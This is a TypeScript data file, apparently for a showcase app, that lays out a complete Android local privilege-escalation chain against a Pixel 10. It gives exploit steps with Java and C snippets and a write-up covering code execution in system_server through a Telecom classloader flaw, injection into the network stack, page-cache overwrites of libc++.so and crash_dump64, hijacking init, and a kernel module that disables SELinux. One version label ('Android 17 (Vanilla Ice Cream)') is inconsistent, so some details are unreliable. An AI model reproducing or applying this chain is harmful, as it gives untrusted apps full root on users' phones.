import { DeviceProfile, ExploitStepInfo } from '../types';

export const DEVICE_PROFILES: DeviceProfile[] = [
  {
    id: 'pixel-10',
    name: 'Google Pixel 10 (Target)',
    model: 'Pixel 10 (franklin)',
    androidVersion: 'Android 17 (Vanilla Ice Cream)',
    kernelVersion: '6.6.21-android17-0-ge9d28a1c',
    buildId: 'AP2A.260705.002',
    securityPatch: '2026-08-01',
    isVulnerable: true,
    notes: 'Primary test device. 100% reproducible success without race conditions or memory spraying.',
  },
  {
    id: 'pixel-6a',
    name: 'Google Pixel 6a (Unsupported)',
    model: 'Pixel 6a (bluejay)',
    androidVersion: 'Android 14',
    kernelVersion: '6.1.75-android14-11-g4a23b',
    buildId: 'UQ1A.240205.002',
    securityPatch: '2024-02-05',
    isVulnerable: false,
    notes: 'Does not work on Pixel 6a due to upstream bugs in 6.1.xxx-android14 kernel trees.',
  },
  {
    id: 'pixel-10-patched',
    name: 'Google Pixel 10 (September 2026 Patch)',
    model: 'Pixel 10 (franklin)',
    androidVersion: 'Android 17 QPR1',
    kernelVersion: '6.6.35-android17',
    buildId: 'AP3A.260905.001',
    securityPatch: '2026-09-01',
    isVulnerable: false,
    notes: 'CVE-2026-49881 patched by removing serviceClassExists check in Telecomm InCallController.',
  },
];

export const EXPLOIT_STEPS: ExploitStepInfo[] = [
  {
    id: 'step-telecom',
    title: '1. Telecom 0-Day Trigger',
    subtitle: 'CVE-2026-49881 in InCallController',
    targetProcess: 'system_server',
    targetUid: 'UID 1000 (system)',
    selinuxDomain: 'system_server.te',
    cve: 'CVE-2026-49881',
    description: 'Bypasses userspace sandbox by forcing system_server to load the untrusted app classloader.',
    vulnerabilityDetail: 'The InCallController in com.android.server.telecom calls createContextAsUser and createPackageContextAsUser with Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY to verify serviceClassExists. Declaring a custom AppComponentFactory in AndroidManifest causes our code to execute inside system_server.',
    language: 'java',
    codeSnippet: `// InCallController.java (AOSP com.android.server.telecom)
private boolean serviceClassExists(ServiceInfo serviceInfo, UserHandle userHandle) {
    Context packageContext = mContext.createPackageContextAsUser(
            serviceInfo.packageName,
            Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY,
            userHandle);
    // getClassLoader() triggers our custom AppComponentFactory!
    ClassLoader classLoader = packageContext.getClassLoader();
    Class.forName(serviceInfo.name, false, classLoader);
    return true;
}`,
  },
  {
    id: 'step-networkstack',
    title: '2. Network Stack Injection',
    subtitle: 'Bypassing system_server SELinux Restrictions',
    targetProcess: 'com.android.networkstack.process',
    targetUid: 'UID 1073 (network_stack)',
    selinuxDomain: 'network_stack.te',
    description: 'system_server is prohibited from loading native libraries or anonymous executable memory. We inject into com.android.networkstack which holds netlink_xfrm_socket rights.',
    vulnerabilityDetail: 'ActivityManagerService inside system_server tracks IApplicationThread instances for all running processes. Using reflection on ProcessList, we retrieve the IApplicationThread for com.android.networkstack and call scheduleReceiver() to load native library libexp.so.',
    language: 'java',
    codeSnippet: `// Shellcode.java - executed inside system_server
Object ams = ServiceManager.getService(Context.ACTIVITY_SERVICE);
Method getProcessRecord = ams.getClass().getDeclaredMethod("getProcessRecordLocked", String.class, int.class);
getProcessRecord.setAccessible(true);
Object networkRecord = getProcessRecord.invoke(ams, "com.android.networkstack.process", 1073);

Method getOnewayThread = networkRecord.getClass().getDeclaredMethod("getOnewayThread");
IApplicationThread appThread = (IApplicationThread) getOnewayThread.invoke(networkRecord);
appThread.scheduleReceiver(intent, receiverInfo, null, 0, null, null, false, false, 0, 0, Process.SYSTEM_UID, "android");`,
  },
  {
    id: 'step-dirtyfrag',
    title: '3. DirtyFrag Kernel Exploit',
    subtitle: 'CVE-2026-43284 (xfrm-ESP zero-copy write)',
    targetProcess: 'Linux Kernel 6.6 Subsystem',
    targetUid: 'Kernel / Page Cache',
    selinuxDomain: 'xfrm_socket',
    cve: 'CVE-2026-43284',
    description: 'Abuses splice() zero-copy to overwrite read-only page cache pages via IPsec ESP in-place packet decryption.',
    vulnerabilityDetail: 'network_stack process creates an XFRM IPsec ESP socket. Using splice(), a read-only page cache page from /system/lib64/libc.so or /vendor/lib64/libstagefright_aidl_bufferpool2.so is spliced into an sk_buff frag. When the kernel processes and decrypts the ESP packet, it performs in-place writes directly into the page cache, bypassing Copy-on-Write.',
    language: 'c',
    codeSnippet: `// exp.c - DirtyFrag page cache overwrite
int pipefd[2];
pipe(pipefd);
// Splice read-only target file into pipe
splice(target_fd, &offset, pipefd[1], NULL, 4096, SPLICE_F_MOVE);
// Splice pipe buffer into IPsec ESP socket
splice(pipefd[0], NULL, esp_sock_fd, NULL, 4096, SPLICE_F_MORE);
// Kernel performs ESP in-place decryption, overwriting page cache!
sendto(encap_sock, payload, len, 0, (struct sockaddr*)&sin, sizeof(sin));`,
  },
  {
    id: 'step-crashdump',
    title: '4. SELinux Domain Transition',
    subtitle: 'crash_dump64 to access vendor_file',
    targetProcess: '/apex/com.android.runtime/bin/crash_dump64',
    targetUid: 'UID 0 / crash_dump',
    selinuxDomain: 'crash_dump.te',
    description: 'network_stack cannot directly open vendor_file domains. We patch crash_dump64 to bridge the SELinux domain boundary.',
    vulnerabilityDetail: 'We patch /apex/com.android.runtime/bin/crash_dump64 using DirtyFrag. Once crash_dump transitions into the crash_dump SELinux domain, it possesses permissions to open /vendor/lib64/libstagefright_aidl_bufferpool2.so.',
    language: 'c',
    codeSnippet: `// Patch crash_dump64 first
int fd = open("/apex/com.android.runtime/bin/crash_dump64", O_RDONLY);
overwrite_page(fd, crash_dump_shellcode, sizeof(crash_dump_shellcode));
// Executing crash_dump transitions domain to vendor_file access
pid_t child = fork();
if (!child) execl("/apex/com.android.runtime/bin/crash_dump64", "crash_dump64", NULL);`,
  },
  {
    id: 'step-orphan',
    title: '5. Orphan Process & Init Hook',
    subtitle: 'Hijacking init through patched libc++.so',
    targetProcess: 'init (PID 1)',
    targetUid: 'UID 0 (root)',
    selinuxDomain: 'init.te',
    description: 'Creating an orphaned process causes PID 1 (init) to adopt and reap it, triggering our patched libc++.so code.',
    vulnerabilityDetail: 'When a child process becomes orphaned and terminates, init cleans up child status, invoking C++ runtime destructors from /system/lib64/libc++.so. Because libc++.so was patched in page cache, init executes our payload in UID 0 under the init domain, launching /vendor/bin/modprobe.',
    language: 'c',
    codeSnippet: `// Trigger init code execution
pid_t pid = fork();
if (pid == 0) {
    if (fork() == 0) {
        // Child orphaned to init (PID 1)
        sleep(1);
        exit(0); // init reaps orphan, triggering patched libc++.so!
    }
    exit(0);
}`,
  },
  {
    id: 'step-kernelsu',
    title: '6. Kernel Module & KernelSU Launch',
    subtitle: 'Full Root (UID 0, Permissive SELinux)',
    targetProcess: 'KernelSU Daemon (ksud)',
    targetUid: 'UID 0 (root)',
    selinuxDomain: 'permissive / kernel',
    description: 'modprobe loads our kernel module (dirtyfrag.ko), disables SELinux enforcement, and spawns the KernelSU daemon.',
    vulnerabilityDetail: 'modprobe runs under vendor_modprobe domain and loads our replaced libstagefright_aidl_bufferpool2.so (disguised kernel module dirtyfrag.ko). The kernel module sets selinux_enforcing = 0 and invokes /data/data/org.lsposed.lspromise/ksud to activate KernelSU for full system superuser management.',
    language: 'c',
    codeSnippet: `// dirtyfrag.ko (Kernel Module execution)
static int __init dirtyfrag_init(void) {
    // Disable SELinux
    selinux_enforcing = 0;
    // Launch KernelSU daemon
    call_usermodehelper("/data/data/org.lsposed.lspromise/ksud", argv, envp, UMH_WAIT_EXEC);
    return 0;
}`,
  },
];

export const TECHNICAL_WRITEUP = `# LSPromise: Complete Android Exploit Chain

**Authors**: canyie & LSPosed Team  
**CVEs**: CVE-2026-49881 (Telecom 0-day) & CVE-2026-43284 (DirtyFrag)  
**Target**: Android 17 (Vanilla Ice Cream) on Pixel 10  
**Impact**: 100% Deterministic Local Privilege Escalation from Untrusted App to Root/Kernel  

---

## 1. Introduction

Unlike traditional exploit chains that rely on probabilistic heap spraying, race conditions, or complex bypasses for **KASLR**, **MTE (Memory Tagging Extension)**, or **CFI (Control Flow Integrity)**, LSPromise is constructed entirely from **deterministic logic bugs**.

By chaining an unchecked classloader instantiation in Android's Telecom service with a zero-copy page cache write vulnerability in the Linux IPsec ESP subsystem, the exploit achieves a **100% success rate** on vulnerable devices.

---

## 2. Vulnerability 1: The Telecom 0-Day (CVE-2026-49881)

The chain begins with a critical logic oversight in \`com.android.server.telecom.InCallController\`. When a call account is queried, the system attempts to verify if an \`InCallService\` exists:

\`\`\`java
private boolean serviceClassExists(ServiceInfo serviceInfo, UserHandle userHandle) {
    try {
        Context packageContext = mContext.createPackageContextAsUser(
                serviceInfo.packageName,
                Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY, userHandle);
        ClassLoader classLoader = packageContext.getClassLoader();
        Class.forName(serviceInfo.name, false, classLoader);
        return true;
    } catch (Exception e) { ... }
}
\`\`\`

### The Flaw
While \`Class.forName(..., false, classLoader)\` avoids running static initializers, invoking \`getClassLoader()\` triggers the app's custom \`AppComponentFactory\` declared in its \`AndroidManifest.xml\`. Because Telecom runs in \`system_server\` under \`android.uid.system\`, the untrusted app's Java code is directly executed inside \`system_server\`.

---

## 3. Transitioning to Network Stack

SELinux policies strictly forbid \`system_server\` from loading native \`.so\` files from \`/data\` or mapping anonymous executable memory (\`execmem\`). Therefore, native kernel exploitation cannot occur directly inside \`system_server\`.

To circumvent this, we look at \`com.android.networkstack\`:
1. It is allowed to load native libraries from our APK.
2. It has SELinux permissions to open \`netlink_xfrm_socket\`.

From \`system_server\`, we access \`ActivityManagerService.getProcessRecordLocked("com.android.networkstack.process", 1073)\` and call \`IApplicationThread.scheduleReceiver()\` to inject \`libexp.so\` into the network stack process.

---

## 4. Vulnerability 2: DirtyFrag (CVE-2026-43284)

CVE-2026-43284 is a logic flaw in the Linux kernel's \`xfrm-ESP\` (IPsec) subsystem. Using the \`splice()\` system call, read-only file page cache pages can be fed into an \`sk_buff\` fragment. 

When the kernel processes incoming ESP packets, it decrypts the ciphertext **in-place** directly within the memory buffer referenced by the fragment. This overwrites the underlying file's page cache, completely bypassing Linux Copy-on-Write (COW).

We patch:
- \`/system/lib64/libc.so\`
- \`/system/lib64/libc++.so\`
- \`/vendor/lib64/libstagefright_aidl_bufferpool2.so\`

---

## 5. Escalation to Root and KernelSU

1. Patch \`/apex/com.android.runtime/bin/crash_dump64\` to bridge into the \`vendor_file\` domain.
2. Replace \`libstagefright_aidl_bufferpool2.so\` with the custom kernel module \`dirtyfrag.ko\`.
3. Fork and destroy an orphan process. \`init\` (PID 1, UID 0) adopts and reaps the process, executing our code in patched \`libc++.so\`.
4. \`init\` triggers \`/vendor/bin/modprobe\`, which loads \`dirtyfrag.ko\` under \`vendor_modprobe\` domain.
5. The kernel module sets SELinux to permissive and executes \`ksud\` to activate KernelSU.
`;
